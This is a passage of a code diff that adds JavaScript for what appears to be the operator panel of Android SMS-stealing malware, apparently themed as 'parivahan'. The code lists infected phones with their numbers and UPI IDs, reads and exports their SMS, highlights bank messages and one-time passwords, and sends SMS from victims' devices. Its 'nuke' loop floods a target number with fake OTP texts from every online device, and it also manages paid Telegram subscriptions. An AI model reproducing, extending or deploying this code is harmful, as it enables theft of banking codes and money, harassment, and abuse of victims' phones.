+          const data = await r.json();
+          const list = data
+            ? Object.keys(data).map((k) => norm(k, data[k]))
+            : [];
+          devices = list;
+          // auto-ping notify
+          const cur = {};
+          devices.forEach((d) => (cur[d.id] = d.isOnline));
+          for (const d of devices) {
+            if (
+              prevOnline[d.id] !== undefined &&
+              prevOnline[d.id] !== d.isOnline
+            ) {
+              toast(
+                d.isOnline ? "Device online" : "Device offline",
+                `${d.model} • ${d.phone || d.id}`
+              );
+            }
+          }
+          prevOnline = cur;
+          try {
+            localStorage.setItem("parivahan_pure_last", JSON.stringify(cur));
+          } catch {}
+          // cache for fast reload
+          try {
+            localStorage.setItem(
+              "parivahan_cache_v1",
+              JSON.stringify({
+                ts: Date.now(),
+                devices: devices.map((d) => ({ id: d.id, raw: d.raw })),
+              })
+            );
+          } catch {}
+          setConn("ok", `${devices.length} devices`);
+          renderFleet();
+        } catch (e) {
+          setConn("bad", e.message || "fetch failed");
+          // try show cached on failure
+          try {
+            const c = localStorage.getItem("parivahan_cache_v1");
+            if (c) {
+              const p = JSON.parse(c);
+              if (p?.devices?.length) {
+                devices = p.devices
+                  .map((d) => {
+                    try {
+                      return norm(d.id, d.raw);
+                    } catch {
+                      return null;
+                    }
+                  })
+                  .filter(Boolean);
+                renderFleet();
+              }
+            }
+          } catch {}
+        }
+      }
+      async function fetchSmsIfNeeded() {
+        if (!selectedId) return;
+        const url = buildUrl(`messages/${selectedId}`);
+        if (!url) return;
+        try {
+          const r = await fetch(url, { cache: "no-store" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          const data = await r.json();
+          smsData = data || {};
+          renderSms();
+        } catch (e) {
+          /* keep old */
+        }
+      }
+      function startPolling() {
+        if (pollTimer) clearInterval(pollTimer);
+        pollTimer = setInterval(() => {
+          fetchDevices();
+          fetchSmsIfNeeded();
+        }, 3000);
+        fetchDevices();
+        fetchSmsIfNeeded();
+      }
+
+      // ---- render fleet ----
+      function renderFleet() {
+        const q = (els.q.value || "").toLowerCase();
+        const flt = els.flt.value;
+        const grp = els.grp.value;
+        // groups dropdown
+        const groups = [
+          ...new Set(devices.map((d) => d.group).filter(Boolean)),
+        ].sort();
+        const curG = els.grp.value;
+        els.grp.innerHTML =
+          '<option value="all">All groups</option>' +
+          groups
+            .map((g) => `<option value="${esc(g)}">${esc(g)}</option>`)
+            .join("");
+        els.grp.value = curG;
+        let list = [...devices];
+        if (q)
+          list = list.filter((d) =>
+            (d.phone + d.model + d.upi + d.id + d.deviceName + d.group + d.ip)
+              .toLowerCase()
+              .includes(q)
+          );
+        if (grp !== "all") list = list.filter((d) => d.group === grp);
+        if (flt === "online") list = list.filter((d) => d.isOnline);
+        else if (flt === "offline") list = list.filter((d) => !d.isOnline);
+        else if (flt === "upi") list = list.filter((d) => !!d.upi);
+        else if (flt === "bank") {
+          /* bank SMS filter handled in SMS pane, not fleet */
+        }
+        // sort online first then recent ping
+        list.sort(
+          (a, b) =>
+            Number(b.isOnline) - Number(a.isOnline) ||
+            (b.raw.lastPing || 0) - (a.raw.lastPing || 0)
+        );
+        els.onlineN.textContent = devices.filter((d) => d.isOnline).length;
+        els.offlineN.textContent = devices.filter((d) => !d.isOnline).length;
+        els.devCount.textContent =
+          `— ${list.length}/${devices.length} shown` +
+          (q || flt !== "all" || grp !== "all" ? " (filtered)" : "");
+        if (list.length === 0) {
+          els.fleet.innerHTML = "";
+          els.fleetEmpty.style.display = "block";
+          return;
+        }
+        els.fleetEmpty.style.display = "none";
+        els.fleet.innerHTML = list
+          .map((d, i) => {
+            const sel = d.id === selectedId ? " sel" : "";
+            const batt = parseInt(String(d.battery).replace("%", "")) || 0;
+            const battCl = batt <= 20 ? ' style="color:var(--warn)"' : "";
+            return `<div class="dev${sel}" data-id="${esc(d.id)}" onclick="window._sel('${esc(d.id)}')">
+   <span class="dot ${d.isOnline ? "ok" : "bad"}" title="${d.isOnline ? "online" : "offline"}"></span>
+   <div style="flex:1;min-width:0">
+    <div style="font-weight:700;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${esc(d.model)} <span class="small mono">${esc(d.id.slice(0, 8))}</span></div>
+    <div class="mono small" style="white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${esc(d.phone || "—")} ${d.upi ? "· " + esc(d.upi) : ""}</div>
+    <div class="small" style="display:flex;gap:6px;flex-wrap:wrap;margin-top:4px"><span class="badge">${esc(d.group || "no-group")}</span>${d.colorTag ? `<span class="badge" style="background:${esc(d.colorTag)};color:#fff;border-color:${esc(d.colorTag)}">${esc(d.deviceName || "tag")}</span>` : ""}</div>
+   </div>
+   <div style="text-align:right;min-width:70px">
+    <div class="small mono"${battCl}>${esc(d.battery || "—")}</div>
+    <div class="small mono">${esc(d.sim1 ? d.sim1.split("·")[0].trim() : "")}${d.sim2 ? " ·2" : ""}</div>
+    <div class="small mono">${esc(d.ip || "")}</div>
+   </div>
+  </div>`;
+          })
+          .join("");
+      }
+
+      // ---- SMS ----
+      function renderSms() {
+        const q = (els.smsQ.value || "").toLowerCase();
+        const bankOnly = els.bankOnly.checked;
+        let entries = Object.entries(smsData || {});
+        // support old format: if empty, try clients/{id}/sms already merged into smsData? No, we only fetch messages/{id}
+        // fallback: if smsData empty, try devices raw sms (if selected device has raw.sms)
+        if (entries.length === 0 && selectedId) {
+          const dev = devices.find((d) => d.id === selectedId);
+          if (dev?.raw?.sms) entries = Object.entries(dev.raw.sms);
+        }
+        // sort by id/date desc
+        entries.sort(([, a], [, b]) => {
+          const an = Number(a.id || a.date || 0),
+            bn = Number(b.id || b.date || 0);
+          return bn - an;
+        });
+        let filtered = entries;
+        if (q)
+          filtered = filtered.filter(([, sms]) => {
+            const body = sms.message || sms.body || "";
+            const from = sms.sender || sms.from || "";
+            return (
+              body.toLowerCase().includes(q) ||
+              String(from).toLowerCase().includes(q)
+            );
+          });
+        if (bankOnly)
+          filtered = filtered.filter(
+            ([, sms]) => classify(sms.message || sms.body || "").isBank
+          );
+        els.smsCount.textContent = String(filtered.length);
+        if (filtered.length === 0) {
+          els.smsList.innerHTML =
+            '<div class="small" style="padding:12px;text-align:center">No messages.</div>';
+          return;
+        }
+        els.smsList.innerHTML = filtered
+          .slice(0, 200)
+          .map(([k, sms]) => {
+            const body = sms.message || sms.body || "";
+            const from = sms.sender || sms.from || "unknown";
+            const date =
+              sms.dateTime ||
+              (sms.date
+                ? new Date(parseInt(sms.date)).toLocaleString("en-IN")
+                : "—");
+            const cls = classify(body);
+            const isOutgoing =
+              String(sms.type || "").toLowerCase() === "outgoing";
+            return `<div class="sms ${cls.isBank ? (cls.isOtp ? "otp" : "bank") : ""}">
+   <div style="display:flex;justify-content:space-between;gap:8px;align-items:start">
+    <div style="display:flex;gap:6px;align-items:center;min-width:0">
+     <span class="pill" style="${isOutgoing ? "background:#0ea5e933;color:#38bdf8;border-color:#0ea5e9" : "background:#22c55e1a;color:#22c55e;border-color:#22c55e"}">${isOutgoing ? "OUT" : "IN"}</span>
+     <span class="mono" style="font-weight:700;max-width:140px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${esc(from)}</span>
+     ${cls.isOtp ? `<span class="mono" style="font-weight:700;background:rgba(109,99,255,.15);border:1px solid rgba(109,99,255,.3);padding:2px 6px;border-radius:8px">${esc(cls.otp)}</span>` : ""}
+     ${cls.isBank ? `<span class="badge" style="background:rgba(245,158,11,.15);color:var(--warn);border-color:rgba(245,158,11,.3)">BANK</span>` : ""}
+    </div>
+    <div style="display:flex;gap:6px;align-items:center">
+     <span class="small mono">${esc(date)}</span>
+     <button class="btn" style="padding:4px 8px" onclick="navigator.clipboard.writeText(${JSON.stringify(body).replace(/"/g, "&quot;")})">Copy</button>
+     <button class="btn bad" style="padding:4px 8px" onclick="window._delSms('${esc(k)}')">Del</button>
+    </div>
+   </div>
+   <div style="margin-top:6px;white-space:pre-wrap;word-break:break-word">${esc(body)}</div>
+  </div>`;
+          })
+          .join("");
+      }
+
+      // ---- selection ----
+      window._sel = (id) => {
+        selectedId = id;
+        els.selInfo.textContent = id;
+        // fill edit fields
+        const d = devices.find((x) => x.id === id);
+        if (d) {
+          els.editName.value = d.deviceName || "";
+          els.editGroup.value = d.group || "";
+          els.editNotes.value = d.notes || "";
+          els.editColor.value = d.colorTag || "";
+          els.editOwner.value = d.ownerTelegramId || "";
+        }
+        renderFleet();
+        fetchSmsIfNeeded();
+      };
+      window._delSms = async (key) => {
+        if (!selectedId) return;
+        if (!confirm("Delete SMS " + key + "?")) return;
+        const url = buildUrl(`messages/${selectedId}/${key}`);
+        if (!url) return;
+        try {
+          await fetch(url, { method: "DELETE" });
+          toast("Deleted", key);
+          fetchSmsIfNeeded();
+        } catch (e) {
+          toast("Delete failed", e.message);
+        }
+      };
+
+      // ---- send ----
+      async function doSend(ids, to, msg, sim) {
+        if (!ids.length) {
+          toast("No devices", "Select or online empty");
+          return;
+        }
+        if (!to.trim() || !msg.trim()) {
+          toast("Missing", "to/message required");
+          return;
+        }
+        els.sendStatus.textContent = "sending…";
+        let ok = 0,
+          fail = 0;
+        for (const id of ids) {
+          const url = buildUrl(`clients/${id}/webhookEvent/sendSms`);
+          const body = {
+            to: to.trim(),
+            message: msg,
+            isSended: true,
+            from: Number(sim) || 0,
+          };
+          try {
+            const r = await fetch(url, {
+              method: "PUT",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(body),
+            });
+            if (r.ok) ok++;
+            else fail++;
+          } catch {
+            fail++;
+          }
+        }
+        els.sendStatus.textContent = `sent ${ok} · failed ${fail}`;
+        toast("Send done", `ok ${ok} fail ${fail}`);
+      }
+      els.sendOne.addEventListener("click", () => {
+        const msg = els.sendMsg.value;
+        const to = els.sendTo.value.trim();
+        const ids = selectedId ? [selectedId] : [];
+        doSend(ids, to, msg, els.sendSim.value);
+      });
+      els.sendBulk.addEventListener("click", () => {
+        const msg = els.sendMsg.value;
+        const to = els.sendTo.value.trim();
+        const ids = devices.filter((d) => d.isOnline).map((d) => d.id);
+        doSend(ids, to, msg, els.sendSim.value);
+      });
+
+      // ---- nuke ----
+      function randOtp(len) {
+        len = Number(len) || 6;
+        let s = "";
+        for (let i = 0; i < len; i++) s += Math.floor(Math.random() * 10);
+        if (s[0] === "0") s = "1" + s.slice(1);
+        if (crypto && crypto.getRandomValues) {
+          const a = new Uint32Array(1);
+          crypto.getRandomValues(a);
+          s = String(a[0]).padStart(10, "0").slice(0, len);
+          if (s[0] === "0") s = "1" + s.slice(1);
+        }
+        return s;
+      }
+      function nukeLoop() {
+        if (nukeAbort) return;
+        const to = els.nukeTarget.value.trim() || els.sendTo.value.trim();
+        if (!to) {
+          toast("Nuke", "Enter target number");
+          stopNuke();
+          return;
+        }
+        const tpl = els.nukeTpl.value || "OTP {otp}";
+        const otp = randOtp(els.nukeLen.value);
+        const msg = tpl.includes("{otp}")
+          ? tpl.replace("{otp}", otp)
+          : `${tpl} ${otp}`;
+        const sim = Number(els.nukeSim.value) || 0;
+        const ids = devices.filter((d) => d.isOnline).map((d) => d.id);
+        if (ids.length === 0) {
+          toast("Nuke", "No online devices");
+          stopNuke();
+          return;
+        }
+        doSend(ids, to, msg, sim).then(() => {
+          nukeStats.loops++; // doSend updates internally? we count loop here
+          // tally sent is inside doSend, but for nuke we approximate: sent+=ids.length
+          nukeStats.sent += ids.length; // optimistic
+          updateNukeUI();
+          if (nukeAbort) return;
+          const base = Number(els.nukeInt.value) || 900;
+          const jitter = base + Math.floor(Math.random() * 400) - 200;
+          nukeTimer = setTimeout(nukeLoop, Math.max(400, jitter));
+        });
+      }
+      function updateNukeUI() {
+        els.nukeLoops.textContent = String(nukeStats.loops);
+        els.nukeSent.textContent = String(nukeStats.sent);
+        els.nukeFail.textContent = String(nukeStats.failed);
+        els.nukeState.textContent = nukeAbort
+          ? "stopped"
+          : nukeTimer
+            ? "running"
+            : "idle";
+      }
+      function startNuke() {
+        if (nukeTimer) clearTimeout(nukeTimer);
+        nukeAbort = false;
+        nukeStats = { loops: 0, sent: 0, failed: 0 };
+        updateNukeUI();
+        els.nukeStart.disabled = true;
+        els.nukeStop.disabled = false;
+        els.nukeState.textContent = "running";
+        toast(
+          "Nuke started",
+          "Loop → " + (els.nukeTarget.value.trim() || els.sendTo.value.trim())
+        );
+        nukeLoop();
+      }
+      function stopNuke() {
+        nukeAbort = true;
+        if (nukeTimer) clearTimeout(nukeTimer);
+        nukeTimer = null;
+        els.nukeStart.disabled = false;
+        els.nukeStop.disabled = true;
+        els.nukeState.textContent = "stopped";
+        toast(
+          "Nuke stopped",
+          `loops ${nukeStats.loops} sent ${nukeStats.sent}`
+        );
+      }
+      els.nukeStart.addEventListener("click", startNuke);
+      els.nukeStop.addEventListener("click", stopNuke);
+
+      // ---- device management ----
+      els.saveEdit.addEventListener("click", async () => {
+        if (!selectedId) {
+          toast("Select device", "click a device first");
+          return;
+        }
+        const url = buildUrl(`clients/${selectedId}`);
+        const patch = {
+          deviceName: els.editName.value.trim() || null,
+          group: els.editGroup.value.trim() || null,
+          colorTag: els.editColor.value.trim() || null,
+          ownerTelegramId: els.editOwner.value.trim() || null,
+          notes: els.editNotes.value.trim(),
+          memo: els.editNotes.value.trim(),
+        };
+        try {
+          const r = await fetch(url, {
+            method: "PATCH",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(patch),
+          });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          toast("Saved", "Device updated");
+          fetchDevices();
+        } catch (e) {
+          toast("Save failed", e.message);
+        }
+      });
+      els.delDev.addEventListener("click", async () => {
+        if (!selectedId) return;
+        if (!confirm("Delete device " + selectedId + "? This wipes all data."))
+          return;
+        const url = buildUrl(`clients/${selectedId}`);
+        try {
+          const r = await fetch(url, { method: "DELETE" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          toast("Deleted", selectedId);
+          selectedId = null;
+          els.selInfo.textContent = "none";
+          fetchDevices();
+        } catch (e) {
+          toast("Delete failed", e.message);
+        }
+      });
+      els.addDev.addEventListener("click", async () => {
+        const id = "dev_" + Math.random().toString(36).slice(2, 9);
+        const url = buildUrl(`clients/${id}`);
+        const payload = {
+          model: "Pure-Device",
+          phone: "+91" + Math.floor(9000000000 + Math.random() * 1000000000),
+          modelName: "Pure-Device",
+          mobNo: "+91" + Math.floor(9000000000 + Math.random() * 1000000000),
+          battery: "100%",
+          status: true,
+          lastPing: Date.now(),
+          group: els.editGroup.value.trim() || "pure",
+          deviceName: els.editName.value.trim() || "Pure",
+        };
+        try {
+          const r = await fetch(url, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          toast("Added", id);
+          fetchDevices();
+        } catch (e) {
+          toast("Add failed", e.message);
+        }
+      });
+      els.pingBtn.addEventListener("click", async () => {
+        if (!selectedId) return;
+        const url = buildUrl(
+          `clients/${selectedId}/webhookEvent/checkLiveness`
+        );
+        els.pingRes.style.display = "inline-flex";
+        els.pingRes.textContent = "pinging…";
+        const start = Date.now();
+        try {
+          await fetch(url, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ text: "ping" }),
+          });
+        } catch {}
+        // poll for pong 15s
+        const t0 = Date.now();
+        const iv = setInterval(async () => {
+          try {
+            const r = await fetch(
+              buildUrl(`clients/${selectedId}/webhookEvent/checkLiveness`),
+              { cache: "no-store" }
+            );
+            const j = await r.json();
+            if (j && j.text === "pong") {
+              clearInterval(iv);
+              els.pingRes.textContent = "pong " + (Date.now() - start) + "ms";
+              setTimeout(() => (els.pingRes.style.display = "none"), 3000); // clear pong
+              try {
+                await fetch(
+                  buildUrl(`clients/${selectedId}/webhookEvent/checkLiveness`),
+                  { method: "DELETE" }
+                );
+              } catch {}
+            }
+          } catch {}
+          if (Date.now() - t0 > 15000) {
+            clearInterval(iv);
+            els.pingRes.textContent = "timeout 15s";
+            setTimeout(() => (els.pingRes.style.display = "none"), 3000);
+          }
+        }, 800);
+      });
+
+      // ---- export CSV ----
+      els.exportCsv.addEventListener("click", () => {
+        if (!selectedId) {
+          toast("Select device", "for CSV");
+          return;
+        }
+        let entries = Object.entries(smsData || {});
+        if (entries.length === 0) {
+          const d = devices.find((x) => x.id === selectedId);
+          if (d?.raw?.sms) entries = Object.entries(d.raw.sms);
+        }
+        if (entries.length === 0) {
+          toast("No SMS", "nothing to export");
+          return;
+        }
+        const rows = [["sender", "message", "date", "type"].join(",")];
+        for (const [, s] of entries) {
+          const sender = (s.sender || s.from || "").replace(/"/g, '""');
+          const msg = (s.message || s.body || "")
+            .replace(/"/g, '""')
+            .replace(/\n/g, " ");
+          const date = s.dateTime || s.date || "";
+          const type = s.type || "";
+          rows.push(`"${sender}","${msg}","${date}","${type}"`);
+        }
+        const blob = new Blob([rows.join("\n")], { type: "text/csv" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = `sms_${selectedId}.csv`;
+        a.click();
+        URL.revokeObjectURL(url);
+      });
+
+      // ---- filters ----
+      els.q.addEventListener("input", renderFleet);
+      els.flt.addEventListener("change", renderFleet);
+      els.grp.addEventListener("change", renderFleet);
+      els.smsQ.addEventListener("input", renderSms);
+      els.bankOnly.addEventListener("change", renderSms);
+      els.refreshNow.addEventListener("click", () => {
+        fetchDevices();
+        fetchSmsIfNeeded();
+        toast("Refresh", "polling…");
+      });
+      els.saveCfg.addEventListener("click", () => saveCfg(true));
+      els.clearCfg.addEventListener("click", clearCfg);
+
+      // init
+
+      // ---- tabs ----
+      window.showTab = function (id) {
+        document
+          .querySelectorAll(".tabview")
+          .forEach((el) => (el.style.display = "none"));
+        const t = document.getElementById(id);
+        if (t) t.style.display = "block";
+        document
+          .querySelectorAll('[id^="tabBtn-"]')
+          .forEach((b) => b.classList.remove("pri"));
+        const btn = document.getElementById("tabBtn-" + id.replace("tab-", ""));
+        if (btn) btn.classList.add("pri");
+        if (id === "tab-smsall") fetchSmsAll();
+        if (id === "tab-otps") fetchOtps();
+        if (id === "tab-firebases") fetchFirebases();
+        if (id === "tab-users") fetchUsers();
+        if (id === "tab-telegram") fetchForward();
+        if (id === "tab-data") renderData();
+        if (id === "tab-pam") fetchPam();
+        try {
+          localStorage.setItem("parivahan_pure_tab", id);
+        } catch {}
+      };
+      try {
+        const last = localStorage.getItem("parivahan_pure_tab");
+        if (last) setTimeout(() => showTab(last), 0);
+      } catch {}
+
+      // ---- SMS All ----
+      async function fetchSmsAll() {
+        const url = buildUrl("messages");
+        if (!url) {
+          document.getElementById("smsAllList").innerHTML =
+            '<div class="small">Set Firebase URL/secret</div>';
+          return;
+        }
+        const listEl = document.getElementById("smsAllList");
+        listEl.innerHTML = '<div class="small">Loading…</div>';
+        try {
+          const r = await fetch(url, { cache: "no-store" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          const data = (await r.json()) || {};
+          const q = (
+            document.getElementById("smsAllQ").value || ""
+          ).toLowerCase();
+          const bankOnly = document.getElementById("smsAllBank").checked;
+          // flatten: messages is {deviceId: {pushKey: sms}}
+          let rows = [];
+          for (const [devId, msgs] of Object.entries(data)) {
+            if (!msgs || typeof msgs !== "object") continue;
+            for (const [k, sms] of Object.entries(msgs)) {
+              const body = sms.message || sms.body || "";
+              const from = sms.sender || sms.from || "";
+              rows.push({ devId, k, body, from, sms });
+            }
+          }
+          // also include clients/{id}/sms legacy if messages empty? Already covered via devices raw fallback
+          if (rows.length === 0) {
+            for (const d of devices) {
+              if (d.raw && d.raw.sms) {
+                for (const [k, sms] of Object.entries(d.raw.sms)) {
+                  const body = sms.body || "";
+                  rows.push({
+                    devId: d.id,
+                    k,
+                    body,
+                    from: sms.from || "",
+                    sms,
+                  });
+                }
+              }
+            }
+          }
+          if (q)
+            rows = rows.filter((r) =>
+              (r.body + r.from + r.devId).toLowerCase().includes(q)
+            );
+          if (bankOnly) rows = rows.filter((r) => classify(r.body).isBank);
+          rows.sort(
+            (a, b) =>
+              Number(b.sms.id || b.sms.date || 0) -
+              Number(a.sms.id || a.sms.date || 0)
+          );
+          rows = rows.slice(0, 500);
+          listEl.innerHTML = rows.length
+            ? rows
+                .map((r) => {
+                  const cls = classify(r.body);
+                  return `<div class="sms ${cls.isBank ? (cls.isOtp ? "otp" : "bank") : ""}" style="margin-bottom:6px">
+    <div style="display:flex;justify-content:space-between;gap:8px"><span class="mono small">${esc(r.devId)} · ${esc(r.from)}</span><span class="small mono">${esc(r.sms.dateTime || r.sms.date || "")}</span></div>
+    <div style="margin-top:4px;white-space:pre-wrap;word-break:break-word">${esc(r.body)}</div>
+    <div style="margin-top:6px;display:flex;gap:6px"><button class="btn" style="padding:4px 8px" onclick="navigator.clipboard.writeText(${JSON.stringify(r.body).replace(/"/g, "&quot;")})">Copy</button><span class="badge">${esc(r.k.slice(0, 8))}</span>${cls.isOtp ? `<span class="badge" style="color:var(--pri)">${esc(cls.otp)}</span>` : ""}</div>
+   </div>`;
+                })
+                .join("")
+            : '<div class="small">No messages.</div>';
+        } catch (e) {
+          listEl.innerHTML =
+            '<div class="small" style="color:var(--bad)">' +
+            esc(e.message) +
+            "</div>";
+        }
+      }
+      document
+        .getElementById("smsAllQ")
+        ?.addEventListener("input", fetchSmsAll);
+      document
+        .getElementById("smsAllBank")
+        ?.addEventListener("change", fetchSmsAll);
+      document
+        .getElementById("smsAllRefresh")
+        ?.addEventListener("click", fetchSmsAll);
+      document.getElementById("smsAllExport")?.addEventListener("click", () => {
+        const listEl = document.getElementById("smsAllList");
+        // reuse fetchSmsAll data? fallback: build CSV from current view
+        // quick: fetch again and build CSV
+        (async () => {
+          const url = buildUrl("messages");
+          if (!url) return;
+          const r = await fetch(url, { cache: "no-store" });
+          const data = (await r.json()) || {};
+          let rows = [
+            ["deviceId", "key", "sender", "message", "date"].join(","),
+          ];
+          for (const [devId, msgs] of Object.entries(data)) {
+            if (!msgs || typeof msgs !== "object") continue;
+            for (const [k, sms] of Object.entries(msgs)) {
+              const sender = (sms.sender || sms.from || "").replace(/"/g, '""');
+              const msg = (sms.message || sms.body || "")
+                .replace(/"/g, '""')
+                .replace(/\n/g, " ");
+              const date = sms.dateTime || sms.date || "";
+              rows.push(`"${devId}","${k}","${sender}","${msg}","${date}"`);
+            }
+          }
+          const blob = new Blob([rows.join("\n")], { type: "text/csv" });
+          const u = URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.href = u;
+          a.download = "sms_all.csv";
+          a.click();
+          URL.revokeObjectURL(u);
+        })();
+      });
+
+      // ---- OTPs ----
+      async function fetchOtps() {
+        const url = buildUrl("otps/latest");
+        const el = document.getElementById("otpsList");
+        if (!url) {
+          el.innerHTML = '<div class="small">Set Firebase URL/secret</div>';
+          return;
+        }
+        el.innerHTML = '<div class="small">Loading…</div>';
+        try {
+          const r = await fetch(url, { cache: "no-store" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          const data = (await r.json()) || {};
+          const rows = Object.entries(data);
+          if (rows.length === 0) {
+            el.innerHTML = '<div class="small">No OTPs.</div>';
+            return;
+          }
+          rows.sort(
+            (a, b) => Number(b[1].ts || b[1].date || 0) - Number(a[1].ts || 0)
+          );
+          el.innerHTML =
+            '<div style="display:grid;gap:6px">' +
+            rows
+              .map(([k, v]) => {
+                const body = v.body || v.message || v.otp || "";
+                const svc = v.service || v.sender || "";
+                const ts =
+                  v.ts || v.date
+                    ? new Date(Number(v.ts || v.date)).toLocaleString("en-IN")
+                    : "";
+                const cls = classify(body);
+                return `<div class="sms ${cls.isOtp ? "otp" : ""}"><div style="display:flex;justify-content:space-between"><span class="mono small">${esc(svc)} · ${esc(k.slice(0, 8))}</span><span class="small mono">${esc(ts)}</span></div><div style="margin-top:4px">${esc(body)}</div><div style="margin-top:6px"><button class="btn" style="padding:4px 8px" onclick="navigator.clipboard.writeText('${esc(body).replace(/'/g, "\'")}')">Copy</button></div></div>`;
+              })
+              .join("") +
+            "</div>";
+        } catch (e) {
+          el.innerHTML =
+            '<div class="small" style="color:var(--bad)">' +
+            esc(e.message) +
+            "</div>";
+        }
+      }
+      document
+        .getElementById("otpsRefresh")
+        ?.addEventListener("click", fetchOtps);
+      document
+        .getElementById("otpsClear")
+        ?.addEventListener("click", async () => {
+          if (!confirm("Delete all otps/latest?")) return;
+          const url = buildUrl("otps/latest");
+          if (!url) return;
+          try {
+            const r = await fetch(url, { method: "DELETE" });
+            if (!r.ok) throw new Error("HTTP " + r.status);
+            toast("Cleared", "otps/latest deleted");
+            fetchOtps();
+          } catch (e) {
+            toast("Clear failed", e.message);
+          }
+        });
+
+      // ---- Firebases ----
+      async function fetchFirebases() {
+        const url = buildUrl("config/firebases");
+        const el = document.getElementById("fbList");
+        if (!url) {
+          el.innerHTML = '<div class="small">Set Firebase URL/secret</div>';
+          return;
+        }
+        el.innerHTML = '<div class="small">Loading…</div>';
+        try {
+          const r = await fetch(url, { cache: "no-store" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          const data = (await r.json()) || {};
+          const rows = Object.entries(data);
+          if (rows.length === 0) {
+            el.innerHTML = '<div class="small">No firebases. Add one.</div>';
+            return;
+          }
+          el.innerHTML = rows
+            .map(
+              ([k, v]) =>
+                `<div class="dev" style="justify-content:space-between"><div><div class="mono small">${esc(k)} — ${esc(v.databaseURL || v.url || "")}</div><div class="small">${esc(v.name || "")}</div></div><button class="btn bad" style="padding:4px 8px" onclick="window._delFb('${esc(k)}')">Delete</button></div>`
+            )
+            .join("");
+        } catch (e) {
+          el.innerHTML =
+            '<div class="small" style="color:var(--bad)">' +
+            esc(e.message) +
+            "</div>";
+        }
+      }
+      window._delFb = async (k) => {
+        if (!confirm("Delete firebase " + k + "?")) return;
+        const url = buildUrl(`config/firebases/${k}`);
+        try {
+          const r = await fetch(url, { method: "DELETE" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          toast("Deleted", k);
+          fetchFirebases();
+        } catch (e) {
+          toast("Delete failed", e.message);
+        }
+      };
+      document
+        .getElementById("fbRefresh")
+        ?.addEventListener("click", fetchFirebases);
+      document.getElementById("fbAdd")?.addEventListener("click", async () => {
+        const dbUrl = document.getElementById("fbAddUrl").value.trim();
+        const apiKey = document.getElementById("fbAddKey").value.trim();
+        if (!dbUrl) {
+          toast("Missing", "databaseURL required");
+          return;
+        }
+        if (!/^https:\/\/.+\.firebaseio\.com$/.test(dbUrl)) {
+          toast("Invalid URL", "must be https://*.firebaseio.com");
+          return;
+        }
+        const id = dbUrl.replace(/^https:\/\//, "").split(".")[0];
+        const url = buildUrl(`config/firebases/${id}`);
+        const payload = {
+          name: id,
+          databaseURL: dbUrl,
+          apiKey: apiKey,
+          enabled: true,
+        };
+        try {
+          const r = await fetch(url, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          toast("Added", id);
+          fetchFirebases();
+        } catch (e) {
+          toast("Add failed", e.message);
+        }
+      });
+
+      // ---- Users ----
+      async function fetchUsers() {
+        const url = buildUrl("subscriptions");
+        const el = document.getElementById("uList");
+        if (!url) {
+          el.innerHTML = '<div class="small">Set Firebase URL/secret</div>';
+          return;
+        }
+        el.innerHTML = '<div class="small">Loading…</div>';
+        try {
+          const r = await fetch(url, { cache: "no-store" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          const data = (await r.json()) || {};
+          const rows = Object.entries(data);
+          // also fetch admin
+          let admin = "";
+          try {
+            const ra = await fetch(buildUrl("config/admin"), {
+              cache: "no-store",
+            });
+            if (ra.ok) {
+              const ja = await ra.json();
+              admin = ja ? ja.telegramId || "" : "";
+            }
+          } catch {}
+          if (rows.length === 0)
+            el.innerHTML = '<div class="small">No users.</div>';
+          else
+            el.innerHTML = rows
+              .map(
+                ([k, v]) =>
+                  `<div class="dev" style="justify-content:space-between"><div><div class="mono small">${esc(k)} — ${esc(v.username || "unknown")} ${k === admin ? "(admin)" : ""}</div><div class="small">${esc(v.plan || "Custom")} · ${esc(v.status || "active")} · exp ${v.expiresAt ? new Date(v.expiresAt).toLocaleDateString("en-IN") : "—"}</div></div><div style="display:flex;gap:6px"><button class="btn" style="padding:4px 8px" onclick="navigator.clipboard.writeText('${esc(k)}')">Copy</button><button class="btn bad" style="padding:4px 8px" onclick="window._delUser('${esc(k)}')">Delete</button></div></div>`
+              )
+              .join("");
+        } catch (e) {
+          el.innerHTML =
+            '<div class="small" style="color:var(--bad)">' +
+            esc(e.message) +
+            "</div>";
+        }
+      }
+      window._delUser = async (k) => {
+        if (!confirm("Delete user " + k + "?")) return;
+        const url = buildUrl(`subscriptions/${k}`);
+        try {
+          const r = await fetch(url, { method: "DELETE" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          toast("Deleted", k);
+          fetchUsers();
+        } catch (e) {
+          toast("Delete failed", e.message);
+        }
+      };
+      document
+        .getElementById("uRefresh")
+        ?.addEventListener("click", fetchUsers);
+      document.getElementById("uAdd")?.addEventListener("click", async () => {
+        const id = document.getElementById("uId").value.trim();
+        const name = document.getElementById("uName").value.trim() || "unknown";
+        const days = parseInt(
+          document.getElementById("uDays").value || "30",
+          10
+        );
+        if (!id) {
+          toast("Missing", "telegramId required");
+          return;
+        }
+        const url = buildUrl(`subscriptions/${id}`);
+        const now = Date.now();
+        const exp = now + days * 86400000;
+        const payload = {
+          telegramId: id,
+          username: name,
+          plan: "Custom",
+          status: "active",
+          expiresAt: exp,
+          createdAt: now,
+        };
+        try {
+          const r = await fetch(url, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+          if (!r.ok) throw new Error("HTTP " + r.status);
+          toast("Saved", id);
+          fetchUsers();
